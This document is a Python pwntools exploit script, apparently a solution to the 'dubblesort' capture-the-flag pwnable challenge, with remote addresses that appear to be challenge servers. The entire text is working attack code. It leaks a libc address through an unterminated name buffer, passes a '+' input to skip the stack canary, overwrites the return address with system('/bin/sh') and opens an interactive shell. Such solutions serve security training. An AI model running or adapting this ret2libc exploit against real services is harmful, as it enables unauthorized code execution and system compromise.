from pwn import *
from LibcSearcher import *
#io=remote("111.198.29.45",31926)
locall=0
if locall==0:
	io=process("./dubblesort")
else:
	io=remote("61.147.171.105",64566)
elf=ELF("./dubblesort")

libc=ELF("libc_32.so.6")


def wirte_number(number):
	io.recvuntil("number : ")
	io.sendline(str(number))
 
 
if __name__=="__main__":
	io.recvuntil("What your name :")
	io.send("1"*28)
	io.recvuntil("1"*28)
	libc_base_addr=u32(io.recv(4))
	#gdb.attach(io)
	log.success('libc_base addr : 0x%x'%libc_base_addr)
	libc_base_addr=libc_base_addr-0x1ae244
	log.success('libc_base addr : 0x%x'%libc_base_addr)
	#gdb.attach(io)
    
	system_addr = libc_base_addr + libc.symbols['system']
	binsh_addr = libc_base_addr + next(libc.search(b'/bin/sh\x00'))
	log.success('system addr : 0x%x'%system_addr)
	log.success('binsh addr : 0x%x'%binsh_addr)
	io.recvuntil("How many numbers do you what to sort :")
	io.sendline("35")
	for i in range(24):
		wirte_number(str(0))
	wirte_number("+")
	#gdb.attach(io)
	for i in range(9):
		wirte_number(str(system_addr))

	wirte_number(str(binsh_addr))
	print (io.recv())
	io.interactive()
	#io.close()
 